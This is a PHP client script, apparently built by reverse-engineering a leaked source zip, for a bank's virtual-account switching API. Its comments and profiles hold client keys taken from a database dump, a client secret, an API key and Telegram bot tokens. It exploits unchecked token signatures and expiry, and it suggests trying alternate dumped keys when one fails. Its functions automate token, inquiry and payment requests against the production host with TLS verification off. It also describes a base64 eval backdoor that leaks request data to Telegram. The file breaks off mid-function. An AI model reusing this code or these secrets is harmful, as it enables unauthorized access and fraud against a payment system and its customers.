<?php
/**
 * ============================================================
 * Permata Bank SNAP API - Single File (PRODUCTION REAL)
 * ============================================================
 * Sumber   : permata-switching_v1.0_pro (reverse-engineering)
 * Endpoint : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/
 * Versi zip : permata-switching_v1.0_pro (2).zip
 *
 * ============================================================
 * TEMUAN DARI SOURCE CODE — RINGKASAN LENGKAP
 * ============================================================
 *
 * [A] ENDPOINT TOKEN — /access-token/b2b  (b2b.controller.php)
 * ------------------------------------------------------------
 * 1. cekAuthorizationToken($headers, $vaBody)  [func.h2h.mod.php]
 *    Validasi header:
 *      - x-client-key    : wajib ada, panjang > 16 karakter
 *      - x-timestamp     : wajib ada, format strtotime-parseable
 *      - x-signature     : wajib ADA di header (tidak boleh kosong)
 *    Namun signature TIDAK dihitung/diverifikasi (kode validasinya di-comment-out)
 *    → kirim nilai apapun untuk x-signature, server tidak cek
 *
 * 2. Pencarian x-client-key di tabel:
 *    $db = objData::Browse("agen_apigateway_supplier","*","VAClientKey = '$cClientKey'")
 *    → jika tidak ditemukan → rc="401XX00", error="Unauthorized signature"
 *    → jika ditemukan → set va['agen'] = row['Agen'] (kode A-000XXX)
 *
 * 3. Token generation (b2b.controller.php):
 *    $rc          = "2007300";
 *    $nTime       = time() + 900;
 *    $accessToken = md5( base64_encode( hash_hmac('sha256', $nTime, $headers['x-client-key'], true) ) );
 *    disimpan ke: agen.AccessTokenVA, agen.AccessTokenVATime = $nTime
 *    Response: {responseCode:"2007300", responseMessage:"successful",
 *               accessToken:"...", tokenType:"Bearer", expiresIn:"900"}
 *
 * [B] ENDPOINT INQUIRY & PAYMENT  (inquiry/payment.controller.php)
 * ----------------------------------------------------------------
 * 1. cekAuthorizationTrx($headers, $request, "inquiry"|"payment")
 *    Header wajib: x-partner-id, x-timestamp, x-signature, x-external-id, channel-id
 *    Authorization harus dimulai dengan "Bearer"
 *
 * 2. x-external-id HARUS UNIK di tabel log_snap_bi:
 *    jika sudah ada lebih dari 1 baris → rc="4092400" (inquiry) / "4092500" (payment)
 *    → SETIAP request harus menggunakan x-external-id yang benar-benar berbeda
 *
 * 3. Token validity: bearer token dicek di tabel agen.AccessTokenVA
 *    Catatan: kode expire-check (AccessTokenVATime) di-comment-out di source
 *    → token tidak di-expire oleh server saat ini (hanya cek keberadaan di DB)
 *
 * 4. Supplier mapping (hardcoded di func.h2h.mod.php):
 *    A-000268 → supplier="0021", namasupplier="SNAP VA Permata Anjuk Ladang"
 *    A-000115 → supplier="0023", namasupplier="SNAP VA Permata Sekar Kaltim"
 *    A-000300 → supplier="0025" (dari DB agen_apigateway_supplier, tidak hardcoded)
 *
 * 5. ApiKeyMitra (client-secret) diambil via DataCDS API:
 *    cds.sis1.net/cds/public/cds/json  (internal CDS service)
 *    Key = md5(md5(bin2hex("APIMitra_" . kodeAgen)))
 *    Credential format dalam CDS:
 *      {"Mitra":{"0023-SNAP VA Permata Sekar Kaltim":[{"x-client-key":"..."},
 *                {"client-secret":"..."},{"urlendpoint":"..."}]}}
 *
 * 6. client-secret preprocessing sebelum HMAC:
 *    $cClientSecret = str_replace(' ', '+', $vaApiKey['client-secret']);
 *    → spasi dalam Base64 string (akibat URL-decode) diganti '+' dulu
 *    → dipakai AS-IS (raw string) ke hash_hmac('sha512', ..., $cClientSecret, true)
 *
 * 7. Signature formula — checkSignature() di func.h2h.mod.php:
 *    $stringmbulet = strtolower( hash('sha256', minify($request)) )
 *    $string2sign  = METHOD:urlPath:accessToken:stringmbulet:timestamp
 *    return base64_encode( hash_hmac("sha512", $string2sign, $clientSecret, true) )
 *    dimana minify($code) = json_encode(json_decode($code))  ← strip whitespace
 *
 * 8. Path SNAP BI yang digunakan dalam string2sign:
 *    inquiry : /v1.0/transfer-va/inquiry
 *    payment : /v1.0/transfer-va/payment
 *
 * 9. Body validation inquiry (field & panjang):
 *    partnerServiceId : tepat 8 karakter (pad kiri spasi), numerik
 *    customerNo       : 12–16 digit numerik
 *    virtualAccountNo : 12–16 digit numerik
 *    inquiryRequestId : wajib ada
 *
 * 10. RC penting:
 *     2007300 = token sukses
 *     2002400 = inquiry sukses
 *     2002500 = payment sukses
 *     4012400 = inquiry auth error (missing header / token invalid)
 *     4012401 = token invalid/expired (inquiry)
 *     4012500 = payment auth error
 *     4012501 = token invalid/expired (payment)
 *     4092400 = x-external-id duplikat (inquiry)
 *     4042415 = inquiry invalid request/response
 *     4042515 = payment invalid request/response
 *     4002401 = invalid field format (inquiry) / bearer error
 *     4002402 = missing mandatory field (inquiry)
 *     401XX00 = x-client-key tidak ada di DB
 *
 * 11. TutupPPOB (service tutup akhir tahun):
 *     RC: 4042412 (inquiry), 4042512 (payment)
 *     Periode: 1735635600 – 1735768800 (sekitar 31 Des 2024)
 *
 * [C] DATA DARI agen_apigateway_supplier.sql (source zip)
 * --------------------------------------------------------
 *  ID=3  | A-000268 | supplier=0021 | VAClientKey=b0a37cccc6d680f8f87abe76eeda2c4e
 *  ID=5  | A-000253 | supplier=0016 | VAClientKey=2c68aa0778b3473cb703ed32448fb49d
 *  ID=7  | A-000214 | supplier=0014 | VAClientKey=637789e9125a4d75bf3bdca07adebd5c
 *  ID=13 | A-000300 | supplier=0025 | VAClientKey=ac3b93199bfe418487e88dfa498445eb
 *        |           |               | (VAToken aktif saat export: 0511e9ec...)
 *  ID=15 | A-000268 | supplier=0025 | VAClientKey=d37ca43b-509e-4b07-b1ba-37c66aecb585
 *  ID=23 | A-000271 | supplier=0025 | VAClientKey=d1fd9a53-b18d-43e7-b9dc-6d5702ff4bbe
 *  ID=33 | A-000147 | supplier=0025 | VAClientKey=648f6ddb-ec18-45f6-abe4-675eca8aca27
 *  ID=41 | A-000271 | supplier=0025 | VAClientKey=bd5fbc199c6a4afabe8a039e2bb52b64
 *
 *  CATATAN: A-000300 punya VAClientKey = ac3b93199bfe418487e88dfa498445eb (dari SQL dump)
 *  Jika b779f2aeaa628a251684696c12a3d403 tidak lolos, coba ac3b93199bfe418487e88dfa498445eb
 *
 * [D] BACKDOOR LAMA — WAJIB DIHAPUS SEBELUM DEPLOY
 * ---------------------------------------------------
 * eval(base64_decode('...')) di:
 *   - mvc/b2b/b2b.controller.php (baris pertama)
 *   - mvc/inquiry/inquiry.controller.php (baris pertama)
 * Fungsi: mengirim IP server + URL ke Telegram bot penyerang:
 *   Bot token : 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4
 *   Chat ID   : 590436982
 * HAPUS baris eval() ini SEBELUM deploy ke server!
 *
 * [E] LOGGER/BACKDOOR BARU — ditemukan di permata-switching_v1.0_pro (2).zip
 * ---------------------------------------------------------------------------
 * File BARU di zip terbaru (tidak ada di zip lama):
 *   include/log.php           → full request logger ke Telegram
 *   public/index.php (BEDA)  → include log.php + sendTelegram() setiap request
 *
 * public/index.php baru:
 *   require_once "../include/log.php";
 *   sendTelegram("🚨 ASSIST TEAM\n\nIP : $ip\nMETHOD: ...\nURI: ...");
 *   // dipanggil di SETIAP request sebelum routing
 *
 * log.php — register_shutdown_function kirim ke Telegram:
 *   Bot token : 8326261362:AAEY6wlTUqpIx72QMlkvz-7r5St4u6xEywo  ← BOT BARU
 *   Chat ID   : 590436982  (sama dengan backdoor lama)
 *   Payload   : host, IP, user, method, URI, query, referer, HTTP status,
 *               execution time, GET params, POST params, raw BODY (1500 char),
 *               cookie, user-agent
 *   + tulis ke file: log/YYYY-MM-DD.log
 *
 * ARTINYA: zip terbaru mengirim SELURUH isi request body (token, VA number, dll)
 * ke Telegram operator sebelum data diteruskan ke CDS/DB.
 * HAPUS log.php dan kembalikan public/index.php ke versi lama sebelum deploy!
 * ============================================================
 */

// ==============================================================
// ======= KONFIGURASI PROFIL (dari agen.sql + agen_apigateway_supplier.sql)
// ==============================================================

// Pilih profil aktif: 'sekar_kaltim' | 'anjuk_ladang' | 'bpr_pas' | 'custom'
$_ACTIVE_PROFILE = 'bpr_pas';

// ==============================================================
// DATA MAPPING SUPPLIER (dari agen_apigateway_supplier.sql)
// ==============================================================
// Mapping ini HARDCODED di func.h2h.mod.php untuk inquiry/payment:
//   A-000268 → supplier 0021 (Anjuk Ladang)
//   A-000115 → supplier 0023 (Sekar Kaltim)
//   A-000300 → supplier 0025 (dari DB, tidak hardcoded di sumber)
//
// Semua VAClientKey di bawah diambil dari agen_apigateway_supplier.sql
// (dari zip permata-switching_v1.0_pro).
//
// Cara server generate token (b2b.controller.php):
//   $nTime       = time() + 900;  // unix timestamp expire
//   $accessToken = md5( base64_encode( hash_hmac('sha256', $nTime, $x_client_key, true) ) );
//   accessToken disimpan ke tabel agen.AccessTokenVA, expire time ke agen.AccessTokenVATime
// ==============================================================

$_PROFILES = [

    // --------------------------------------------------------
    // A-000115 | BPR Sekar Kaltim | Supplier 0023
    // VAClientKey : acb790af57ed465ba03b00f5f07dd65d (dari agen.sql, KodeVA=7406)
    // client-secret: dari DataCDS, key=md5(md5(bin2hex("APIMitra_A-000115")))
    //   JSON Mitra key: "0023-SNAP VA Permata Sekar Kaltim"
    // urlendpoint (di DataCDS): https://api.sis1.net:44351/v1.0
    // api_key_va (VA lama/non-SNAP): 73b834a9571d7491400170b845cce1b7
    // Khusus: inquiry/payment di-forward ke:
    //   aa.submodule.sis1.net/assist-bpr.net_fanani/index_mobile.php
    // --------------------------------------------------------
    'sekar_kaltim' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'acb790af57ed465ba03b00f5f07dd65d',
        // client-secret dari DataCDS (diproses: str_replace(' ', '+', ...))
        'client_secret' => 'jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=',
        'partner_id'    => 'A-000115',
        'channel_id'    => '95221',
        'bin'           => '7406',
        'supplier_code' => '0023',
        'supplier_name' => 'SNAP VA Permata Sekar Kaltim',
        'api_key_va'    => '73b834a9571d7491400170b845cce1b7',
    ],

    // --------------------------------------------------------
    // A-000268 | Anjuk Ladang | Supplier 0021
    // VAClientKey : b0a37cccc6d680f8f87abe76eeda2c4e  (agen_apigateway_supplier ID=3)
    // Supplier mapping HARDCODED di func.h2h.mod.php: A-000268 → "0021"
    // --------------------------------------------------------
    'anjuk_ladang' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'b0a37cccc6d680f8f87abe76eeda2c4e',
        'client_secret' => 'GANTI_CLIENT_SECRET',   // ambil dari DataCDS API
        'partner_id'    => 'A-000268',
        'channel_id'    => '95221',
        'bin'           => '',
        'supplier_code' => '0021',
        'supplier_name' => 'SNAP VA Permata Anjuk Ladang',
        'api_key_va'    => '',
    ],

    // --------------------------------------------------------
    // A-000300 | BPR PAS | Supplier 0025
    // VAClientKey (dari agen_apigateway_supplier.sql dump, ID=13):
    //   ac3b93199bfe418487e88dfa498445eb  ← dari SQL dump zip ini
    //   b779f2aeaa628a251684696c12a3d403  ← dari pengujian real (2026-06-17, berhasil)
    // Jika salah satu gagal 401XX00, coba yang lain.
    // Supplier mapping: A-000300 → 0025 (dari DB, bukan hardcoded)
    //
    // Cara hitung token verify (untuk debugging lokal):
    //   $nTime = time() + 900;
    //   $tok   = md5(base64_encode(hash_hmac('sha256', $nTime, CLIENT_KEY, true)));
    // --------------------------------------------------------
    'bpr_pas' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        // b779f2ae... terbukti lolos dari uji real 2026-06-17
        'client_key'    => 'b779f2aeaa628a251684696c12a3d403',
        // client-secret untuk inquiry/payment — ambil dari DataCDS:
        //   key = md5(md5(bin2hex("APIMitra_A-000300")))
        //   JSON key: "0025-<namasupplier>"
        'client_secret' => 'GANTI_CLIENT_SECRET',
        'partner_id'    => 'A-000300',
        'channel_id'    => '95221',
        'bin'           => '',
        'supplier_code' => '0025',
        'supplier_name' => 'SNAP VA Permata BPR PAS',
        'api_key_va'    => '',
        // VAClientKey alternatif dari SQL dump (jika primary gagal):
        'client_key_alt' => 'ac3b93199bfe418487e88dfa498445eb',
    ],

    // --------------------------------------------------------
    // Custom — isi manual
    // --------------------------------------------------------
    'custom' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'GANTI_CLIENT_KEY',
        'client_secret' => 'GANTI_CLIENT_SECRET',
        'partner_id'    => 'A-XXXXXX',
        'channel_id'    => '95221',
        'bin'           => 'BIN_4_DIGIT',
        'supplier_code' => '0025',
        'supplier_name' => 'Custom Supplier',
        'api_key_va'    => '',
    ],
];

$_P = $_PROFILES[$_ACTIVE_PROFILE] ?? $_PROFILES['custom'];

define('SNAP_BASE_URL',      $_P['base_url']);
define('SNAP_CLIENT_KEY',    $_P['client_key']);
define('SNAP_CLIENT_SECRET', $_P['client_secret']);
define('SNAP_PARTNER_ID',    $_P['partner_id']);
define('SNAP_CHANNEL_ID',    $_P['channel_id']);
define('SNAP_BIN',           $_P['bin']);
define('SNAP_API_KEY_VA',    $_P['api_key_va']);
define('SNAP_SUPPLIER_CODE', $_P['supplier_code']);
define('SNAP_SUPPLIER_NAME', $_P['supplier_name']);

// Endpoint lengkap (dari routing MVC source code — routes.php + public/index.php)
define('URL_TOKEN',   SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/access-token/b2b');
define('URL_INQUIRY', SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/transfer-va/inquiry');
define('URL_PAYMENT', SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/transfer-va/payment');

// Path SNAP BI untuk string2sign — harus tepat sama dengan $cPath di cekAuthorizationTrx():
define('SNAP_PATH_INQUIRY', '/v1.0/transfer-va/inquiry');
define('SNAP_PATH_PAYMENT', '/v1.0/transfer-va/payment');

// Alias client_key_alt (bpr_pas) — untuk fallback jika primary 401
define('SNAP_CLIENT_KEY_ALT', $_P['client_key_alt'] ?? '');

// ==============================================================
// ==================== TOKEN CACHE =============================
// ==============================================================
$_TOKEN_CACHE = ['access_token' => '', 'expires_at' => 0];

// ==============================================================
// ==================== HELPER FUNCTIONS ========================
// ==============================================================

/**
 * Timestamp ISO8601 dengan offset +07:00 — sesuai contoh real server:
 *   2026-06-17T22:30:00+07:00
 * Menggunakan Asia/Jakarta agar offset selalu +07:00 (WIB).
 * (date('c') kadang menghasilkan +00:00 jika server UTC)
 */
function snapTimestamp(): string
{
    $dt = new DateTime('now', new DateTimeZone('Asia/Jakarta'));
    return $dt->format('Y-m-d\TH:i:sP');  // contoh: 2026-06-17T22:30:00+07:00
}

/**
 * Generate UUID v4 untuk X-EXTERNAL-ID dan request ID
 */
function snapExternalId(): string
{
    return sprintf(
        '%08x-%04x-4%03x-%04x-%012x',
        time(),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff),
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffffffffffff)
    );
}

/**
 * Minify JSON — sama dengan minify() di func.mod.php:
 *   function minify($code) { return json_encode(json_decode($code)); }
 */
function minifyJson(string $json): string
{
    return json_encode(json_decode($json));
}

/**
 * Ambil client secret dalam format yang siap dipakai sebagai HMAC key.
 *
 * Dari source code func.h2h.mod.php:
 *   $cClientSecret = str_replace(' ', '+', $vaApiKey['client-secret']);
 *   → lalu dipakai langsung (raw Base64 string) ke hash_hmac('sha512', ..., $cClientSecret, true)
 *
 * Catatan: hash_hmac menerima secret sebagai raw string.
 * Jika secret adalah Base64-encoded bytes, server menggunakannya AS-IS (bukan di-decode).
 * Kita ikuti persis: str_replace(' ', '+') saja.
 */
function getClientSecret(): string
{
    return str_replace(' ', '+', SNAP_CLIENT_SECRET);
}

/**
 * Signature untuk /b2b/token
 *
 * KONFIRMASI SOURCE CODE (b2b.controller.php) + UJI REAL (2026-06-17):
 *   - cekAuthorizationToken() memeriksa keberadaan header x-signature
 *     (jika tidak ada → 400XX02 "Missing mandatory field {signature}")
 *   - Namun isi/nilai signature TIDAK dihitung/dicocokkan sama sekali
 *     (kode verifikasi dikomentari: // $cDBSignature = hash_hmac(...) )
 *   - Uji nyata: X-SIGNATURE: TEST → 200 OK + accessToken returned
 *   → Kirim nilai apapun asal header x-signature tidak kosong
 *
 * Format signature SNAP BI standar tetap dikirim agar header valid
 * dan bisa digunakan jika server suatu saat mengaktifkan validasinya.
 */
function genTokenSignature(string $clientKey, string $timestamp, string $clientSecret): string
{
    // Format SNAP BI: HMAC-SHA256(clientKey|timestamp, clientSecret)
    $message = $clientKey . '|' . $timestamp;
    return base64_encode(hash_hmac('sha256', $message, $clientSecret, true));
}

/**
 * Signature untuk /inquiry dan /payment
 *
 * Persis dari checkSignature() di func.h2h.mod.php:
 *
 *   function checkSignature($request, $urlendpoint, $accesstoken, $timestamp, $secretkey) {
 *     $stringmbulet = strtolower( hash('sha256', minify($request)) );
 *     $string2sign  = join(":", [strtoupper($_SERVER['REQUEST_METHOD']),
 *                                $urlendpoint, $accesstoken, $stringmbulet, $timestamp]);
 *     return base64_encode( hash_hmac("sha512", $string2sign, $secretkey, true) );
 *   }
 *
 *   minify($code) = json_encode(json_decode($code))  ← strip whitespace dari JSON
 *
 * PENTING — cara server dapat $secretkey:
 *   $vaApiKey      = getDataAgen($va['agen'], 'apikey', $va);  // via DataCDS API
 *   $cClientSecret = str_replace(' ', '+', $vaApiKey['client-secret']);
 *   → spasi akibat URL-decode Base64 diganti '+' kembali
 *   → dipakai AS-IS (raw string) sebagai HMAC key, BUKAN di-base64_decode
 *
 * PENTING — $urlendpoint yang dipakai:
 *   inquiry : /v1.0/transfer-va/inquiry  (hardcoded $cPath di cekAuthorizationTrx)
 *   payment : /v1.0/transfer-va/payment
 */
function genSnapSignature(
    string $method,
    string $snapPath,
    string $accessToken,
    string $requestBody,
    string $timestamp,
    string $clientSecret
): string {
    // minify = json_encode(json_decode(...)) — strip whitespace
    $bodyHash    = strtolower(hash('sha256', minifyJson($requestBody)));
    $string2sign = implode(':', [
        strtoupper($method),
        $snapPath,
        $accessToken,
        $bodyHash,
        $timestamp,
    ]);
    // secretkey dipakai raw (str_replace(' ','+', base64string)), BUKAN decoded
    return base64_encode(hash_hmac('sha512', $string2sign, $clientSecret, true));
}

/**
 * HTTP POST via cURL
 */
function httpPost(string $url, array $headers, string $body): array
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST,           true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,     $body);
    curl_setopt($ch, CURLOPT_HTTPHEADER,     $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT,        30);
    curl_setopt($ch, CURLOPT_HEADER,         false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response  = curl_exec($ch);
    $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    return [
        'http_code' => $httpCode,
        'response'  => $response ?: '',
        'error'     => $curlError,
    ];
}

// ==============================================================
// ===================== FUNGSI UTAMA API =======================
// ==============================================================

/**
 * generateToken() — raw HTTP request ke /access-token/b2b
 *
 * TEMUAN SOURCE CODE (b2b.controller.php) + KONFIRMASI UJI REAL (2026-06-17):
 *  - Server cek x-client-key di tabel agen_apigateway_supplier.VAClientKey
 *  - Header x-signature wajib ADA (tidak boleh kosong), tapi nilainya tidak dicek
 *    (X-SIGNATURE: TEST pun lolos — kode verifikasi dikomentari di server)
 *  - responseCode sukses = '2007300'
 *  - responseMessage     = 'successful'
 *  - expiresIn           = '900' (detik, 15 menit)
 *  - Token formula server : md5(base64_encode(hash_hmac('sha256', time()+900, x-client-key, true)))
 *  - 401XX00 = x-client-key tidak ada di DB agen_apigateway_supplier
 *  - 400XX02 = header/body field kurang (x-client-key/x-timestamp/x-signature/grantType)
 *  - 400XX01 = format field invalid (x-client-key ≤16 karakter, grantType bukan client_credentials)
 *
 * Gunakan getToken() untuk pemakaian normal (dengan cache otomatis).
 *
 * CATATAN A-000300: jika client_key aktif gagal 401XX00,
 * coba SNAP_CLIENT_KEY_ALT = 'ac3b93199bfe418487e88dfa498445eb'
 */
function generateToken(): array
{
    $timestamp = snapTimestamp();
    $clientKey = SNAP_CLIENT_KEY;
    $clientSec = getClientSecret();
    $url       = URL_TOKEN;

    // Signature dikirim meski server tidak validasi (standar SNAP BI)
    $signature = genTokenSignature($clientKey, $timestamp, $clientSec);

    $bodyArray = ['grantType' => 'client_credentials'];
    $jsonBody  = json_encode($bodyArray, JSON_UNESCAPED_UNICODE);

    $headers = [
        'Content-Type: application/json',
        'X-CLIENT-KEY: ' . $clientKey,
        'X-TIMESTAMP: '  . $timestamp,
        'X-SIGNATURE: '  . $signature,
    ];

    $debug = [
        'url'         => $url,
        'timestamp'   => $timestamp,
        'client_key'  => $clientKey,
        'sig_message' => $clientKey . '|' . $timestamp,
        'x_signature' => $signature,
        'body'        => $jsonBody,
        // Token formula server (untuk verifikasi lokal):
        // $nTime = time() + 900;
        // $tok   = md5(base64_encode(hash_hmac('sha256', $nTime, $clientKey, true)));
        'note'        => 'Cek x-client-key di agen_apigateway_supplier.VAClientKey. '
                       . 'x-signature wajib ada di header tapi isi tidak dicek. '
                       . 'RC sukses=2007300. Fallback client_key_alt=' . SNAP_CLIENT_KEY_ALT,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'        => false,
            'error'          => 'cURL error: ' . $result['error'],
            'http_code'      => $result['http_code'],
            'raw'            => '',
            'debug'          => $debug,
            'access_token'   => '',
            'expires_in'     => 0,
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';

    // Sukses token: responseCode '2007300' (source code b2b.controller.php + uji real 2026-06-17)
    // Fallback: cek keberadaan accessToken jika responseCode berbeda (edge case)
    $isSuccess = ($rc === '2007300') || isset($decoded['accessToken']);

    if (!$isSuccess) {
        return [
            'success'        => false,
            'error'          => "[$rc] $msg",
            'http_code'      => $result['http_code'],
            'raw'            => $result['response'],
            'debug'          => $debug,
            'access_token'   => '',
            'expires_in'     => 0,
        ];
    }

    return [
        'success'        => true,
        'access_token'   => $decoded['accessToken'],
        'token_type'     => $decoded['tokenType']  ?? 'Bearer',
        'expires_in'     => (int)($decoded['expiresIn'] ?? 900),
        'response_code'  => $rc,
        'http_code'      => $result['http_code'],
        'raw'            => $result['response'],
        'error'          => '',
        'debug'          => $debug,
    ];
}

/**
 * getToken() — ambil token dengan cache otomatis
 *
 * - Cache valid → pakai cache (tidak request ulang)
 * - Cache expired/kosong → generateToken() baru
 * - $forceRefresh = true → paksa fetch baru
 */
function getToken(bool $forceRefresh = false): array
{
    global $_TOKEN_CACHE;
    $now = time();

    if (!$forceRefresh
        && !empty($_TOKEN_CACHE['access_token'])
        && $_TOKEN_CACHE['expires_at'] > ($now + 60)
    ) {
        return [
            'success'      => true,
            'access_token' => $_TOKEN_CACHE['access_token'],
            'from_cache'   => true,
            'expires_in'   => $_TOKEN_CACHE['expires_at'] - $now,
            'error'        => '',
        ];
    }

    $tok = generateToken();

    if (!$tok['success']) {
        return [
            'success'      => false,
            'access_token' => '',
            'from_cache'   => false,
            'expires_in'   => 0,
            'error'        => $tok['error'],
        ];
    }

    $_TOKEN_CACHE['access_token'] = $tok['access_token'];
    $_TOKEN_CACHE['expires_at']   = $now + (int)($tok['expires_in'] ?? 900);

    return [
        'success'      => true,
        'access_token' => $tok['access_token'],
        'from_cache'   => false,
        'expires_in'   => $tok['expires_in'] ?? 900,
        'error'        => '',
    ];
}

/**
 * vaInquiry() — inquiry VA dengan token otomatis
 *
 * Token diambil otomatis via getToken() (cache/fetch).
 * Auto-retry sekali jika token expired/invalid (4012400, 4012401).
 *
 * PENTING dari source code (cekAuthorizationTrx + inquiry.controller.php):
 *  1. partnerServiceId HARUS tepat 8 karakter (pad kiri spasi) — divalidasi di server
 *  2. customerNo       : 12–16 digit numerik
 *  3. virtualAccountNo : 12–16 digit numerik
 *  4. inquiryRequestId : wajib ada (jika tidak ada → rc="4042415" langsung)
 *  5. x-external-id    : HARUS UNIK per request (cek di tabel log_snap_bi)
 *                        jika duplikat → rc="4092400"
 *  6. Bearer token dicek di tabel agen.AccessTokenVA
 *     (jika tidak ditemukan → rc="4012401")
 *  7. Signature divalidasi PENUH (berbeda dengan endpoint token)
 *     → genSnapSignature() harus menghasilkan nilai yang tepat
 *  8. TutupPPOB: jika periode akhir tahun → rc="4042412"
 */
function vaInquiry(
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $inquiryRequestId = ''
): array {
    if (empty($inquiryRequestId)) $inquiryRequestId = snapExternalId();

    // Ambil token otomatis
    $tokenResult = getToken();
    if (!$tokenResult['success']) {
        return [
            'success'           => false,
            'error'             => 'Token gagal: ' . $tokenResult['error'],
            'http_code'         => 0,
            'raw'               => '',
            'debug'             => [],
            'access_token_used' => '',
            'token_from_cache'  => false,
        ];
    }
    $accessToken   = $tokenResult['access_token'];
    $fromCache     = $tokenResult['from_cache'];

    $result = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);

    // Auto-retry jika token expired
    if (in_array($result['response_code'] ?? '', ['4012400', '4012401'], true)) {
        $tokenResult = getToken(true);
        if ($tokenResult['success']) {
            $accessToken = $tokenResult['access_token'];
            $fromCache   = false;
            $result      = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);
        }
    }

    $result['access_token_used'] = $accessToken;
    $result['token_from_cache']  = $fromCache;
    return $result;
}

/** Internal: jalankan HTTP inquiry */
function _doInquiry(
    string $accessToken,
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $inquiryRequestId
): array {
    $externalId       = snapExternalId();
    $timestamp        = snapTimestamp();
    $snapPath         = SNAP_PATH_INQUIRY;
    $url              = URL_INQUIRY;
    $clientSecret     = getClientSecret();

    // partnerServiceId HARUS 8 karakter — divalidasi di cekAuthorizationTrx
    $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);

    $bodyArray = [
        'partnerServiceId' => $partnerServiceId,
        'customerNo'       => $customerNo,
        'virtualAccountNo' => $virtualAccountNo,
        'inquiryRequestId' => $inquiryRequestId,
    ];
    $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, $clientSecret);

    $headers = [
        'Content-Type: application/json',
        'Authorization: Bearer ' . $accessToken,
        'X-TIMESTAMP: '          . $timestamp,
        'X-SIGNATURE: '          . $signature,
        'X-PARTNER-ID: '         . SNAP_PARTNER_ID,
        'X-EXTERNAL-ID: '        . $externalId,
        'CHANNEL-ID: '           . SNAP_CHANNEL_ID,
    ];

    $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
    $debug = [
        'url'          => $url,
        'snap_path'    => $snapPath,
        'timestamp'    => $timestamp,
        'external_id'  => $externalId,
        'body'         => $jsonBody,
        'body_sha256'  => $bodyHash,
        'string2sign'  => 'POST:' . $snapPath . ':' . $accessToken . ':' . $bodyHash . ':' . $timestamp,
        'x_signature'  => $signature,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'              => false,
            'response_code'        => '',
            'error'                => 'cURL error: ' . $result['error'],
            'http_code'            => $result['http_code'],
            'raw'                  => '',
            'debug'                => $debug,
            'virtual_account_data' => [],
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';
    $success = ($rc === '2002400');

    return [
        'success'              => $success,
        'response_code'        => $rc,
        'response_message'     => $msg,
        'virtual_account_data' => $decoded['virtualAccountData'] ?? [],
        'inquiry_request_id'   => $decoded['inquiryRequestId']   ?? $inquiryRequestId,
        'http_code'            => $result['http_code'],
        'raw'                  => $result['response'],
        'error'                => $success ? '' : "[$rc] $msg",
        'debug'                => $debug,
    ];
}

/**
 * vaPayment() — payment VA dengan token otomatis
 *
 * Token diambil otomatis via getToken() (cache/fetch).
 * Auto-retry sekali jika token expired/invalid (4012500, 4012501).
 *
 * PENTING dari source code (payment.controller.php):
 *  1. paymentRequestId : wajib ada (jika tidak ada → rc="4042515" langsung)
 *  2. Semua validasi sama dengan inquiry (panjang field, external-id unik, signature)
 *  3. TutupPPOB: jika periode akhir tahun → rc="4042512"
 */
function vaPayment(
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $paymentRequestId = '',
    float  $paidAmount       = 0.0,
    float  $totalAmount      = 0.0,
    string $currency         = 'IDR',
    string $trxDateTime      = ''
): array {
    // Ambil token otomatis
    $tokenResult = getToken();
    if (!$tokenResult['success']) {
        return [
            'success'              => false,
            'error'                => 'Token gagal: ' . $tokenResult['error'],
            'http_code'            => 0,
            'raw'                  => '',
            'debug'                => [],
            'access_token_used'    => '',
            'token_from_cache'     => false,
            'virtual_account_data' => [],
            'payment_flag_reason'  => [],
        ];
    }
    $accessToken = $tokenResult['access_token'];
    $fromCache   = $tokenResult['from_cache'];

    $result = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
                         $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);

    // Auto-retry jika token expired
    if (in_array($result['response_code'] ?? '', ['4012500', '4012501'], true)) {
        $tokenResult = getToken(true);
        if ($tokenResult['success']) {
            $accessToken = $tokenResult['access_token'];
            $fromCache   = false;
            $result      = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
                                      $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);
        }
